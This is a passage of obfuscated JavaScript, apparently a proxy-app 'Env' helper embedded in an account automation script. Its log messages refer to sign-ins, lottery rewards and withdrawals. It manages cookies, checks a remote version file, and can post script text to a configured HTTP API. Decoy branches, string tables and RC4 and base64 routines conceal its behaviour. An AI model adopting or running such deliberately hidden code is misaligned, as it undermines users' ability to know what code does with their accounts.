          this[Y['rrTpo']] = this[Y["rrTpo"]] ? this[Y['rrTpo']] : Q(Y["rrTpo"]);
          this[Y["UnXkB"]] = this[Y["UnXkB"]] ? this["cktough"] : Y["cAMVP"](B, "tough-cookie");
          this[Y["mFpUE"]] = this[Y["mFpUE"]] ? this[Y["mFpUE"]] : new this[Y["UnXkB"]][Y["LTxZc"]]();
          b && (U[Y["VJjUU"]] = q[Y["VJjUU"]] ? i[Y["VJjUU"]] : {}, Y['vrsHI'](void 0, J[Y['VJjUU']][Y["QOMQZ"]]) && Y["SoJiS"](void 0, I[Y['yJigh']]) && (V[Y["yJigh"]] = this[Y['mFpUE']]));
        }
      }
    }

    [p["JIeBo"]](S) {
      let a = {
        'M+': p["fSfdS"](new Date()[p["OEkKP"]](), 1),
        'd+': new Date()[p["TAFtK"]](),
        'H+': new Date()["getHours"](),
        'm+': new Date()["getMinutes"](),
        's+': new Date()[p["QECaO"]](),
        'q+': Math[p["nxqaa"]](p["WqjEM"](p["txpGr"](new Date()["getMonth"](), 3), 3)),
        'S': new Date()[p["jMDGH"]]()
      };
      /(y+)/[p['XaBsU']](S) && (S = S['replace'](RegExp['$1'], p["wQqon"](new Date()[p["vLoad"]](), '')[p["dPlSl"]](p['JeirW'](4, RegExp['$1'][p['OakBY']]))));

      for (let Y in a) new RegExp(p['vUthb']('(' + Y, ')'))[p['XaBsU']](S) && (S = S["replace"](RegExp['$1'], p["LLmyY"](1, RegExp['$1'][p["OakBY"]]) ? a[Y] : p['ZlJQz']('00', a[Y])["substr"](p["eEfWA"]('', a[Y])[p["OakBY"]])));

      return S;
    }

    [p["eQYiN"]](S = T, a = '', Y = '', j) {
      const Z = {
        'wMqeN': p["RlKZK"],
        'WCRGY': function (b, U) {
          return p["PpyVH"](b, U);
        },
        'iUZhn': function (b, U) {
          return b % U;
        },
        'qffcN': function (b, U) {
          return p["jSddq"](b, U);
        },
        'aOhEf': function (b, U) {
          return p["kVVAm"](b, U);
        },
        'MiEod': p['OakBY'],
        'zvDrH': function (b, U) {
          return p["wPjul"](b, U);
        },
        'KDQsK': function (b, U) {
          return p['KRplz'](b, U);
        },
        'DjhXb': function (b, U) {
          return p["wQqon"](b, U);
        },
        'zHrJR': function (b, U) {
          return p["mPAYK"](b, U);
        },
        'MJnpc': function (b, U) {
          return p["YJetv"](b, U);
        },
        'jUtTe': function (b, U) {
          return p["ShnvD"](b, U);
        },
        'hhLSV': function (b, U) {
          return p['ELjRv'](b, U);
        },
        'dmtuI': function (b, U) {
          return p["HyRKw"](b, U);
        },
        'ldZhU': p["OaFOK"],
        'VTwAq': function (b, U) {
          return b - U;
        },
        'hPmmG': function (b, U) {
          return p['qWGQE'](b, U);
        },
        'YDHRy': function (b, U) {
          return p['xDXpN'](b, U);
        },
        'bKDWx': function (b, U) {
          return b !== U;
        },
        'LZHXt': p["izmSL"],
        'EoLOn': "toString",
        'hwIWL': p["zkpOW"],
        'EfgPP': p["nWjqV"],
        'dGjDt': p['BoyEO'],
        'OGhYm': function (b, U) {
          return b == U;
        },
        'cnJkv': function (b, U) {
          return b === U;
        },
        'teEEH': "xISDc",
        'OxMya': p["gXLLg"],
        'JlvfM': "isQuanX",
        'bfFaI': p["NvGvD"],
        'ITWFr': p["yNHJl"],
        'qMTjB': p['lwNtd'],
        'TwJbk': p["ojkaK"],
        'yzszi': p["mKOJb"],
        'Dxbdp': p["QiEkZ"],
        'JqtGl': "CaRgg",
        'dnnui': p["fkYsv"]
      },
            Q = b => {
        if (!b) {
          return b;
        }

        if (Z["OGhYm"]("string", typeof b)) {
          if (Z["cnJkv"](Z["teEEH"], "lwRTd")) {
            const J = Z["wMqeN"]["split"]('|');
            let I = 0;

            while (true) {
              switch (J[I++]) {
                case '0':
                  z = Z["WCRGY"](Z["iUZhn"](v, 4), 8);
                  continue;

                case '1':
                  h[Z["qffcN"](P, 2)] = Z['aOhEf'](E, 3);
                  continue;

                case '2':
                  for (var V, E = C[Z['MiEod']], W = E + 8, O = Z["qffcN"](W, Z['zvDrH'](W, 64)) / 64, P = Z["KDQsK"](16, Z["DjhXb"](O, 1)), h = new S(P - 1), z = 0, v = 0; Z['zHrJR'](E, v);) {
                    V = Z["MJnpc"](Z["jUtTe"](v, Z["zvDrH"](v, 4)), 4);
                    z = Z["WCRGY"](Z["zvDrH"](v, 4), 8);
                    h[V] = Z['hhLSV'](h[V], Z["dmtuI"](Y[Z["ldZhU"]](v), z));
                    v++;
                  }

                  continue;

                case '3':
                  V = Z["MJnpc"](Z["VTwAq"](v, v % 4), 4);
                  continue;

                case '4':
                  h[Z["qffcN"](P, 1)] = Z["hPmmG"](E, 29);
                  continue;

                case '5':
                  return h;

                case '6':
                  h[V] = Z["hhLSV"](h[V], Z["YDHRy"](128, z));
                  continue;
              }

              break;
            }
          } else {
            return this[Z["OxMya"]]() ? b : this[Z['JlvfM']]() ? {
              'open-url': b
            } : this[Z['bfFaI']]() ? {
              'url': b
            } : void 0;
          }
        }

        if (Z["OGhYm"](Z["ITWFr"], typeof b)) {
          if (this["isLoon"]()) {
            let q = b[Z["qMTjB"]] || b[Z['TwJbk']] || b[Z["yzszi"]],
                i = b[Z["Dxbdp"]] || b["media-url"];
            const J = {
              'openUrl': q,
              'mediaUrl': i
            };
            return J;
          }

          if (this["isQuanX"]()) {
            if (Z["cnJkv"](Z["JqtGl"], "CaRgg")) {
              let I = b[Z["yzszi"]] || b[Z["TwJbk"]] || b["openUrl"],
                  V = b[Z["dnnui"]] || b["mediaUrl"];
              const E = {
                'open-url': I,
                'media-url': V
              };
              return E;
            } else {
              return Z["bKDWx"](E(W), O) ? P : (h[Z["LZHXt"]](z) || (v = M[Z['EoLOn']]()[Z['hwIWL']](/[^.[\]]+/g) || []), d[Z["EfgPP"]](0, -1)[Z['dGjDt']]((l, R, r) => m(l[R]) === l[R] ? l[R] : l[R] = n["abs"](F[r + 1]) >> 0 == +w[r + 1] ? [] : {}, o)[g[t["length"] - 1]] = L, X);
            }
          }

          if (this["isSurge"]()) {
            let O = b[Z["TwJbk"]] || b[Z["qMTjB"]] || b["open-url"];
            const P = {
              'url': O
            };
            return P;
          }
        }
      };

      this["isMute"] || (this[p['NvGvD']]() || this['isLoon']() ? $notification[p["JBlns"]](S, a, Y, p["zYPmU"](Q, j)) : this["isQuanX"]() && p["PEJul"]($notify, S, a, Y, p["BBKJc"](Q, j)));
      let B = ['', p["BRCNQ"]];
      B["push"](S);
      a && B[p["Knwkb"]](a);
      Y && B[p["Knwkb"]](Y);
      console["log"](B[p["XgvQO"]]("\n"));
      this[p["pWUNv"]] = this[p["pWUNv"]][p["thwoM"]](B);
    }

    [p["EpagF"]](...S) {
      p["TDfto"](S[p["OakBY"]], 0) && (this[p["pWUNv"]] = [...this[p["pWUNv"]], ...S]);
      console[p["EpagF"]](S[p["XgvQO"]](this["logSeparator"]));
    }

    [p["bdYaD"]](S, a) {
      const Y = !this[p["NvGvD"]]() && !this[p["TEhQN"]]() && !this[p["gXLLg"]]();
      Y ? this["log"]('', p["wQqon"]('❗️', this[p["Gfcja"]]) + ", 错误!", S["stack"]) : this["log"]('', p["gqCJK"]('❗️' + this[p["Gfcja"]], ", 错误!"), S);
    }

    [p["OOTUt"]](S) {
      if (p['zjgDG'](p["GBjsa"], p["GBjsa"])) {
        this[p['vahvK']] = c;
      } else {
        return new Promise(Y => setTimeout(Y, S));
      }
    }

    ["done"](S = {}) {
      const a = new Date()[p["rwkXM"]](),
            Y = p['YJetv'](p['BRBwt'](a, this[p["GpvDT"]]), 1000);
      this[p["EpagF"]]('', p['vUthb'](p["YvJVr"](p['wQqon']('🔔' + this[p["Gfcja"]], p["QFjSh"]), Y), " 秒"));
      this[p["EpagF"]]();
      (this[p['NvGvD']]() || this[p["TEhQN"]]() || this[p["gXLLg"]]()) && $done(S);
    }

  }(T, c);
}

function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

  this["encode"] = function (c) {
    var S = '';
    var a, Y, j, Z, Q, B, b;
    var U = 0;
    c = _utf8_encode(c);

    while (U < c["length"]) {
      a = c['charCodeAt'](U++);
      Y = c["charCodeAt"](U++);
      j = c["charCodeAt"](U++);
      Z = a >> 2;
      Q = (a & 3) << 4 | Y >> 4;
      B = (Y & 15) << 2 | j >> 6;
      b = j & 63;
      isNaN(Y) ? B = b = 64 : isNaN(j) && (b = 64);
      S = S + _keyStr["charAt"](Z) + _keyStr['charAt'](Q) + _keyStr["charAt"](B) + _keyStr["charAt"](b);
    }

    return S;
  };

  this["decode"] = function (c) {
    var a = '';
    var B, b, U;
    var Y, j, Z, Q;
    var S = 0;
    c = c["replace"](/[^A-Za-z0-9\+\/\=]/g, '');

    while (S < c["length"]) {
      Y = _keyStr["indexOf"](c["charAt"](S++));
      j = _keyStr["indexOf"](c["charAt"](S++));
      Z = _keyStr["indexOf"](c["charAt"](S++));
      Q = _keyStr["indexOf"](c["charAt"](S++));
      B = Y << 2 | j >> 4;
      b = (j & 15) << 4 | Z >> 2;
      U = (Z & 3) << 6 | Q;
      a = a + String["fromCharCode"](B);
      Z != 64 && (a = a + String["fromCharCode"](b));
      Q != 64 && (a = a + String["fromCharCode"](U));
    }

    a = _utf8_decode(a);
    return a;
  };

  _utf8_encode = function (c) {
    c = c["replace"](/\r\n/g, "\n");
    var C = '';

    for (var S = 0; S < c['length']; S++) {
      var a = c["charCodeAt"](S);
      a < 128 ? C += String["fromCharCode"](a) : a > 127 && a < 2048 ? (C += String["fromCharCode"](a >> 6 | 192), C += String["fromCharCode"](a & 63 | 128)) : (C += String["fromCharCode"](a >> 12 | 224), C += String["fromCharCode"](a >> 6 & 63 | 128), C += String['fromCharCode'](a & 63 | 128));
    }

    return C;
  };

  _utf8_decode = function (c) {
    var C = '',
        S = 0,
        a = c1 = c2 = 0;

    while (S < c["length"]) {
      a = c["charCodeAt"](S);
      a < 128 ? (C += String["fromCharCode"](a), S++) : a > 191 && a < 224 ? (c2 = c["charCodeAt"](S + 1), C += String["fromCharCode"]((a & 31) << 6 | c2 & 63), S += 2) : (c2 = c["charCodeAt"](S + 1), c3 = c["charCodeAt"](S + 2), C += String["fromCharCode"]((a & 15) << 12 | (c2 & 63) << 6 | c3 & 63), S += 3);
    }

    return C;
  };
}

function rc4(T, c) {
  var C = Array(256),
      S = Array(T["length"]);

  for (var a = 0; a < 256; a++) {
    C[a] = a;
    var Y = (Y + C[a] + c["charCodeAt"](a % c["length"])) % 256,
        j = C[a];
    C[a] = C[Y];
    C[Y] = j;
  }

  for (var a = 0; a < T["length"]; a++) {
    S[a] = T["charCodeAt"](a);
  }

  for (var Z = 0; Z < S["length"]; Z++) {
    var a = (a + 1) % 256,
        Y = (Y + C[a]) % 256,
        j = C[a];
    C[a] = C[Y];
    C[Y] = j;
    var Q = (C[a] + C[Y] % 256) % 256;
    S[Z] = String["fromCharCode"](S[Z] ^ C[Q]);
  }

  return S["join"]('');
}

function Envcc(T, c) {
  const p = {
    'wRnuE': "env",
    'PDrmV': function (S, a) {
      return S(a);
    },
    'FapYM': function (S, a) {
      return S(a);
    },
    'WvfSd': 'call',
    'OoXTZ': "map",
    'cdqvA': "parse",
    'zmrLt': "toString",
    'YPnZK': 'ckjar',
    'UpyIA': 'logErr',
    'PXCCW': function (S, a) {
      return S === a;
    },
    'pqblD': "qAsGn",
    'WbeEC': function (S, a) {
      return S == a;
    },
    'vIUQB': "POST",
    'zptFf': "log",
    'EcJAc': '账号[',
    'hxvZu': "name",
    'boRCj': "]查询抽奖页定时奖励情况失败：",
    'VwoKu': function (S, a) {
      return S !== a;
    },
    'Htjiv': "EJKGE",
    'GMguY': 'send',
    'NEcdZ': function (S, a, Y) {
      return S(a, Y);
    },
    'HNDsZ': function (S, a, Y) {
      return S(a, Y);
    },
    'JpIGP': function (S, a) {
      return S === a;
    },
    'aApbK': function (S, a) {
      return S != a;
    },
    'hRXNr': function (S, a) {
      return S == a;
    },
    'okFDC': "undefined",
    'Zwxxh': 'MTepH',
    'Mzgbt': "HMwTv",
    'oeVnq': "11|6|3|8|1|9|10|5|2|7|4|0",
    'UAuSH': function (S, a) {
      return S + a;
    },
    'Fjqqa': "utf-8",
    'bJyZO': "data",
    'jQefX': "assign",
    'xzBCS': 'http',
    'imQKp': 'startTime',
    'jbVZH': "getTime",
    'wCvXJ': 'isMute',
    'dkryr': "isNeedRewrite",
    'kkbnz': function (S, a) {
      return S != a;
    },
    'qIGuz': "exports",
    'nmBmt': function (S, a) {
      return S != a;
    },
    'Zzmyf': function (S, a) {
      return S == a;
    },
    'gioVk': function (S, a) {
      return S === a;
    },
    'CnEfG': "HxKxD",
    'QtKtG': function (S, a) {
      return S != a;
    },
    'fpuZw': function (S, a) {
      return S === a;
    },
    'FgZlD': "AHzwK",
    'DgwhA': "lHXBK",
    'PiSmr': "NLWYM",
    'OgQON': "zRrSp",
    'vzzEN': 'getdata',
    'vaAWG': 'abcdef0123456789',
    'aSWQu': function (S, a) {
      return S < a;
    },
    'cYctR': "charAt",
    'uEvTH': function (S, a) {
      return S * a;
    },
    'KBoeX': "random",
    'WnFvT': "hLdMl",
    'mIfvu': "xULcc",
    'yglKX': 'stringify',
    'RKmAs': "get",
    'QwtqA': function (S, a) {
      return S >= a;
    },
    'LTEld': "version",
    'AVAsN': '现在运行的脚本版本是：1.07，最新脚本版本：',
    'prrOr': "latestVersion",
    'EqCpB': "msg",
    'Qdwtu': "status",
    'NSIoc': "versionMsg",
    'DAJch': "@chavy_boxjs_userCfgs.httpapi",
    'EdUvM': "trim",
    'AVPvJ': "@chavy_boxjs_userCfgs.httpapi_timeout",
    'LTJuQ': function (S, a) {
      return S * a;
    },
    'ZlfGt': "timeout",
    'WSLCy': 'split',
    'Dwexk': function (S, a) {
      return S + a;
    },
    'gSLSA': "http://",
    'iesQr': "/v1/scripting/evaluate",
    'QxIbu': "cron",
    'ccPna': "*/*",
    'NOwog': "MkvhJ",
    'MMyiS': "catch",
    'ZBOFC': "isNode",
    'wUYJJ': function (S, a) {
      return S(a);
    },
    'pmWBT': "path",
    'QXGGz': function (S, a) {
      return S(a);
    },
    'KvgPB': "resolve",
    'QspTd': "dataFile",
    'ySAzz': "cwd",
    'BXaOH': "existsSync",
    'VuYEk': function (S, a) {
      return S && a;
    },
    'tQZbc': "readFileSync",
    'rBckB': function (S, a) {
      return S === a;
    },
    'VyRiM': 'UEraE',
    'jBDZB': "hkbyF",
    'ahFam': "fromCharCode",
    'kAQmo': function (S, a) {
      return S !== a;
    },
    'FMTfD': 'kDzql',
    'hJxpZ': "eQWjE",
    'sPEzq': "bnOhL",
    'PCnUE': function (S, a) {
      return S(a);
    },
    'KHYMh': function (S, a) {
      return S(a);
    },
    'GOITo': "writeFileSync",
    'RDxrj': "5|4|3|1|0|2",
    'BjSlF': "length",
    'ZlUFa': "0|8|3|1|5|6|2|7|4",
    'VjGXc': "charCodeAt",
    'VmoGf': function (S, a) {
      return S & a;
    },
    'qomwh': "_keyStr",
    'LpZyx': function (S, a) {
      return S | a;
    },
    'TeveR': function (S, a) {
      return S << a;
    },
    'Ibluv': function (S, a) {
      return S & a;
    },
    'TkIxf': function (S, a) {
      return S << a;
    },
    'wUfba': "_utf8_encode",
    'aLzlr': function (S, a) {
      return S !== a;
    },
    'guzpm': "CrMaX",
    'vrSbp': "bRRDZ",
    'oxSDa': 'replace',
    'OAKFP': ".$1",
    'lCgzA': function (S, a) {
      return S(a);
    },
    'iLgkV': function (S, a) {
      return S === a;
    },
    'GlHrm': function (S, a) {
      return S !== a;
    },
    'CeFwA': 'BoyRi',
    'AoWvA': "NVuvf",
    'kjSki': function (S, a) {
      return S !== a;
    },
    'NdcoI': "isArray",
    'FSxYT': "reduce",
    'klehG': "test",
    'sOCit': "exec",
    'KpXSW': "getval",
    'cfFUW': "lodash_get",
    'wRgjR': "]签到失败：",
    'TtNvJ': "error_msg",
    'vnBXj': function (S, a) {
      return S + a;
    },
    'JfCen': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'wNPNi': function (S, a) {
      return S !== a;
    },
    'TcHpJ': "prbsh",
    'Tmahj': "ozouY",
    'jubRa': "null",
    'LMtso': function (S, a) {
      return S || a;
    },
    'zrOJZ': function (S, a) {
      return S === a;
    },
    'zFqyz': "qJWLK",
    'WWoXF': "lodash_set",
    'CMAOs': "setval",
    'dceom': 'ijzfe',
    'JighY': 'updateMsg',
    'uwDzR': "https://ziye0.coding.net/p/ziye/d/ql/git/raw/master/ks.json",
    'CvmUM': function (S, a) {
      return S === a;
    },
    'QfLFC': "JwVvM",
    'pFleU': "isLoon",
    'tDtzG': "read",
    'iQFDW': "isQuanX",
    'Dixqr': "valueForKey",
    'oaHVG': "loaddata",
    'SjPNS': function (S, a) {
      return S > a;
    },
    'grcPA': function (S, a) {
      return S | a;
    },
    'byKEy': function (S, a) {
      return S + a;
    },
    'lEwQp': function (S, a) {
      return S | a;
    },
    'VRRCq': function (S, a) {
      return S << a;
    },
    'OwlMa': function (S, a) {
      return S & a;
    },
    'bigyF': function (S, a) {
      return S & a;
    },
    'trKFz': function (S, a) {
      return S === a;
    },
    'pXFEM': "aVSMM",
    'otPpW': "isSurge",
    'vZbwI': 'write',
    'VLgNd': "setValueForKey",
    'sqZqT': "writedata",
    'QWjjK': "got",
    'DkbBH': function (S, a) {
      return S(a);
    },
    'UiSpV': "cktough",
    'XKCmp': "CookieJar",
    'CnQpI': 'headers',
    'TtnJv': function (S, a) {
      return S === a;
    },
    'RMosR': 'Cookie',
    'YNyqr': function (S, a) {
      return S === a;
    },
    'yVUhK': "cookieJar",
    'wIaAf': function (S, a) {
      return S == a;
    },
    'zbicl': "QKHhJ",
    'xxCGx': "body",
    'OILzj': "statusCode",
    'Artlm': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'GELSz': "]余额不足0.3元，不提现",
    'wxdsy': 'LjfqP',
    'whkmH': 'CzBPb',
    'LnFLI': "bymqF",
    'AZIgJ': function (S, a) {
      return S === a;
    },
    'yVGro': "BmuZC",
    'YwLUJ': "KmvgX",
    'mwHZH': "set-cookie",
    'tePDi': 'setCookieSync',
    'eXpjG': function (S, a) {
      return S !== a;
    },
    'JUiUY': "yDiix",
    'gsqaw': "decode",
    'FhEjN': "rawBody",
    'RFRMI': "encoding",
    'LeKWn': function (S, a) {
      return S === a;
    },
    'etbIn': 'post',
    'joTdF': "XSULk",
    'IVzJq': 'IrpfA',
    'TmduP': "Content-Length",
    'vqIld': "JOXaJ",
    'DSYHW': 'opts',
    'AVdeR': "fetch",
    'dpyRy': "iconv-lite",
    'NZKvT': 'initGotEnv',
    'DtvFl': "redirect",
    'oyxHj': "then",
    'PGeLw': function (S, a) {
      return S === a;
    },
    'eOJgE': "AsThB",
    'BiCfK': function (S, a) {
      return S && a;
    },
    'PONzR': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'jwBsW': function (S, a) {
      return S | a;
    },
    'QuYWg': function (S, a) {
      return S & a;
    },
    'VjinD': function (S, a) {
      return S + a;
    },
    'XdkAK': function (S, a) {
      return S & a;
    },
    'BIiQy': "bJLXK",
    'UYJcj': "==============📣系统通知📣==============",
    'GyCOW': "concat",
    'sgTIG': function (S, a, Y, j) {
      return S(a, Y, j);
    },
    'COyHl': function (S, a) {
      return S === a;
    },
    'FqyOv': "jYEvO",
    'XqpKL': "method",
    'YiMkm': "toLocaleLowerCase",
    'GPTjE': "Content-Type",
    'KGaQY': 'application/x-www-form-urlencoded',
    'uxKuS': 'HGUEt',
    'YflCp': "bZxCy",
    'SzLrO': "yeYDk",
    'iLBMM': "LTQaE",
    'TlowU': function (S, a) {
      return S(a);
    },
    'VDccZ': "brNJU",
    'eAvjM': "getMonth",
    'holXm': "getHours",
    'xDdDr': 'getMinutes',
    'BhRez': "getSeconds",
    'TvWRe': "floor",
    'eORan': "getMilliseconds",
    'vbWqg': "getFullYear",
    'tqfVj': "substr",
    'JXjvz': function (S, a) {
      return S - a;
    },
    'fVzdw': function (S, a) {
      return S + a;
    },
    'TzKdY': function (S, a) {
      return S + a;
    },
    'CjPRq': function (S, a) {
      return S + a;
    },
    'fbhqs': function (S, a) {
      return S !== a;
    },
    'StGXT': "znjmL",
    'DqQSs': function (S, a) {
      return S == a;
    },
    'xzljc': "string",
    'GbhIY': "object",
    'oWRuK': function (S, a) {
      return S !== a;
    },
    'iKVwy': 'WWFLo',
    'YwySq': "ckHuL",
    'PHvoA': 'url',
    'YrFOy': "open-url",
    'qHwIR': "mediaUrl",
    'neFMM': "openUrl",
    'AmYlh': "media-url",
    'QcLsp': "uiCEd",
    'lTwok': function (S, a) {
      return S | a;
    },
    'PWzGA': function (S, a) {
      return S >> a;
    },
    'RQlYQ': function (S, a) {
      return S | a;
    },
    'dnKxP': function (S, a) {
      return S >> a;
    },
    'MuZQP': function (S, a) {
      return S | a;
    },
    'LUylu': function (S, a) {
      return S & a;
    },
    'MwUVs': function (S, a) {
      return S(a);
    },
    'DlZAG': function (S, a, Y, j, Z) {
      return S(a, Y, j, Z);
    },
    'Ofyag': "isMuteLog",
    'QJAuk': function (S, a) {
      return S === a;
    },
    'gbJiu': "YYdDH",
    'hVYZM': 'push',
    'WWffZ': "join",
    'gIXmD': "logs",
    'BLLLJ': function (S, a) {
      return S !== a;
    },
    'qOijJ': "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz",
    'NjfUP': "eYFZF",
    'PLJvd': ", 错误!",
    'yObaT': 'stack',
    'fkDrB': function (S, a) {
      return S + a;
    },
    'UiWzb': "pxcPd",
    'uoqhc': function (S, a) {
      return S + a;
    },
    'EREtS': function (S, a) {
      return S + a;
    },
    'MvbJz': "toObj",
    'mzrfF': "toStr",
    'IaSsp': "getjson",
    'uUAlE': "getScript",
    'QrmhW': 'runScript',
    'gpnqP': 'time',
    'TymXe': 'fwcaas',
    'imxhs': "fwur",
    'BkHGP': "wait",
    'YOrWi': "done"
  };

  class C {
    constructor(S) {
      this[p["wRnuE"]] = S;
    }

    [p["GMguY"]](S, a = "GET") {
      const Y = {
        'XdGrR': 'set-cookie',
        'CPaVV': p['OoXTZ'],
        'XBELw': p["cdqvA"],
        'gcPYo': p["zmrLt"],
        'glnQd': p["YPnZK"],
        'FFtYF': "setCookieSync",
        'HXLpy': p["UpyIA"]
      };

      if (p["PXCCW"]("qAsGn", p["pqblD"])) {
        S = p["WbeEC"]('string', typeof S) ? {
          'url': S
        } : S;
        let j = this["get"];
        p["PXCCW"](p['vIUQB'], a) && (j = this["post"]);
        return new Promise((Z, Q) => {
          j[p["WvfSd"]](this, S, (b, U, q) => {
            b ? Q(b) : Z(U);
          });
        });
      } else {
        try {
          if (Y["headers"][Y['XdGrR']]) {
            const Q = Q['headers']["set-cookie"][Y["CPaVV"]](this["cktough"]["Cookie"][Y["XBELw"]])[Y["gcPYo"]]();
            Q && this[Y["glnQd"]][Y['FFtYF']](Q, null);
            B["cookieJar"] = this[Y["glnQd"]];
          }
        } catch (B) {
          this[Y["HXLpy"]](B);
        }
      }
    }

    [p["RKmAs"]](S) {
      const a = {
        'eHCcS': p['zptFf'],
        'xkDzr': function (Y, j) {
          return Y + j;
        },
        'FCjiY': function (Y, j) {
          return Y + j;
        },
        'uQLSO': p["EcJAc"],
        'QGlfp': p["hxvZu"],
        'MBRoi': p["boRCj"]
      };

      if (p["VwoKu"](p["Htjiv"], "EJKGE")) {
        p[a["eHCcS"]](a['xkDzr'](a["FCjiY"](a['uQLSO'] + this[a["QGlfp"]], a["MBRoi"]), C["error_msg"]));
      } else {
        return this[p["GMguY"]][p["WvfSd"]](this[p["wRnuE"]], S);
      }
    }

    [p["etbIn"]](S) {
      return p['JpIGP']("KhBhn", "cXwUb") ? (I = V(E, W(O(P(h, z, v), M), d)), u(e(A, k), o)) : this["send"][p["WvfSd"]](this["env"], S, p['vIUQB']);
    }

  }

  return new class {
    constructor(S, a) {
      if (p["VwoKu"](p['Zwxxh'], p["Mzgbt"])) {
        const Y = p['oeVnq']["split"]('|');
        let j = 0;

        while (true) {
          switch (Y[j++]) {
            case '0':
              this[p["zptFf"]]('', p["UAuSH"]('🔔' + this[p["hxvZu"]], ", 开始!"));
              continue;

            case '1':
              this["logs"] = [];
              continue;

            case '2':
              this['encoding'] = p['Fjqqa'];
              continue;

            case '3':
              this[p["bJyZO"]] = null;
              continue;

            case '4':
              Object[p["jQefX"]](this, a);
              continue;

            case '5':
              this["logSeparator"] = "\n";
              continue;

            case '6':
              this[p["xzBCS"]] = new C(this);
              continue;

            case '7':
              this[p['imQKp']] = new Date()[p["jbVZH"]]();
              continue;

            case '8':
              this["dataFile"] = 'box.dat';
              continue;

            case '9':
              this[p["wCvXJ"]] = false;
              continue;

            case '10':
              this[p['dkryr']] = false;
              continue;

            case '11':
              this[p['hxvZu']] = S;
              continue;
          }

          break;
        }
      } else {
        return p["aApbK"]('undefined', typeof p) && p["hRXNr"](p["okFDC"], typeof C);
      }
    }

    [p["ZBOFC"]]() {
      return p["kkbnz"](p["okFDC"], typeof module) && !!module[p["qIGuz"]];
    }

    [p['iQFDW']]() {
      return p["nmBmt"](p["okFDC"], typeof $task);
    }

    [p["otPpW"]]() {
      return p["okFDC"] != typeof $httpClient && p["Zzmyf"]("undefined", typeof $loon);
    }

    [p["pFleU"]]() {
      return p["gioVk"](p['CnEfG'], p["CnEfG"]) ? p["QtKtG"](p['okFDC'], typeof $loon) : "undefined" != typeof c;
    }

    ["isShadowrocket"]() {
      const S = {
        'caZdA': p["cdqvA"],
        'QhDXD': 'getdata'
      };

      if (p["fpuZw"](p["FgZlD"], "AHzwK")) {
        return p["QtKtG"](p["okFDC"], typeof $rocket);
      } else {
        try {
          Y = j[S["caZdA"]](this[S['QhDXD']](Z));
        } catch {}
      }
    }

    [p['MvbJz']](S, a = null) {
      try {
        return JSON[p["cdqvA"]](S);
      } catch {
        return a;
      }
    }

    [p['mzrfF']](S, a = null) {
      if (p["DgwhA"] !== p["PiSmr"]) {
        try {
          return JSON["stringify"](S);
        } catch {
          return a;
        }
      } else {
        let Z = C["url"] || S["openUrl"] || a["open-url"];
        const Q = {
          'url': Z
        };
        return Q;
      }
    }

    [p['IaSsp']](S, a) {
      const Y = {
        'rKyTe': p["cdqvA"]
      };
      let j = a;
      const Z = this["getdata"](S);

      if (Z) {
        if (p['JpIGP'](p["OgQON"], p["OgQON"])) {
          try {
            j = JSON[p['cdqvA']](this[p["vzzEN"]](S));
          } catch {}
        } else {
          const b = a[Y["rKyTe"]](Y);
          j = b ? this["lodash_get"](b, Z, '') : Q;
        }
      }

      return j;
    }

    ["setjson"](S, a) {
      const Y = {
        'wliis': p["vaAWG"],
        'JRSbt': 'length',
        'pjdTB': function (j, Z) {
          return p["aSWQu"](j, Z);
        },
        'fDJEf': p["cYctR"],
        'diDAp': "floor",
        'gaxPI': function (j, Z) {
          return p["uEvTH"](j, Z);
        },
        'FyMTl': p['KBoeX']
      };

      try {
        if (p['VwoKu'](p["WnFvT"], p['mIfvu'])) {
          return this["setdata"](JSON[p["yglKX"]](S), a);
        } else {
          let Z = Y["wliis"],
              Q = Z[Y["JRSbt"]],
              B = '';

          for (Y = 0; Y["pjdTB"](j, Z); Q++) {
            B += Z[Y["fDJEf"]](U[Y["diDAp"]](Y["gaxPI"](q[Y["FyMTl"]](), Q)));
          }

          return B;
        }
      } catch {
        return false;
      }
    }

    [p["uUAlE"]](S) {
      return new Promise(a => {
        const Y = {
          'url': S
        };
        this[p["RKmAs"]](Y, (j, Z, Q) => a(Q));
      });
    }

    [p["QrmhW"]](S, a) {
      if (p["JpIGP"]('ViWHE', p["NOwog"])) {
        if (p["QwtqA"](q, i[p["LTEld"]])) {
          d = true;
          u = "https://ziye0.coding.net/p/ziye/d/ql/git/raw/master/ks.json";
          e[p["zptFf"]](A[p['EqCpB']][k[p["Qdwtu"]]]);
          o['log'](g["updateMsg"]);
          t["log"](p["UAuSH"](p["AVAsN"], L[p['prrOr']]));
        } else {
          X[p['zptFf']](m[p['NSIoc']]);
        }
      } else {
        return new Promise(j => {
          let Z = this[p["vzzEN"]](p["DAJch"]);
          Z = Z ? Z["replace"](/\n/g, '')[p["EdUvM"]]() : Z;
          let Q = this['getdata'](p["AVPvJ"]);
          Q = Q ? p["LTJuQ"](1, Q) : 20;
          Q = a && a[p["ZlfGt"]] ? a[p["ZlfGt"]] : Q;
          const [B, b] = Z[p["WSLCy"]]('@'),
                U = {
            'url': p['Dwexk'](p["gSLSA"], b) + p["iesQr"],
            'body': {
              'script_text': S,
              'mock_type': p['QxIbu'],
              'timeout': Q
            },
            'headers': {
              'X-Key': B,
              'Accept': p["ccPna"]
            }
          };
          this["post"](U, (q, i, J) => j(J));
        })[p['MMyiS']](j => this['logErr'](j));
      }
    }

    ["loaddata"]() {
      if (!this[p["ZBOFC"]]()) {
        return {};
      }

      {
        this['fs'] = this['fs'] ? this['fs'] : p['wUYJJ'](require, 'fs');
        this[p["pmWBT"]] = this["path"] ? this[p["pmWBT"]] : p['QXGGz'](require, p["pmWBT"]);
        const S = this[p["pmWBT"]][p['KvgPB']](this[p['QspTd']]),
              a = this["path"][p["KvgPB"]](process[p["ySAzz"]](), this[p["QspTd"]]),
              Y = this['fs'][p["BXaOH"]](S),
              j = !Y && this['fs'][p['BXaOH']](a);

        if (p['VuYEk'](!Y, !j)) {
          return {};
        }

        {
          const Z = Y ? S : a;

          try {
            return JSON[p["cdqvA"]](this['fs'][p["tQZbc"]](Z));
          } catch (Q) {
            return p["rBckB"](p["VyRiM"], p["jBDZB"]) ? c : {};
          }
        }
      }
    }

    [p["sqZqT"]]() {
      const S = {
        'ouYdd': function (a, Y, j, Z) {
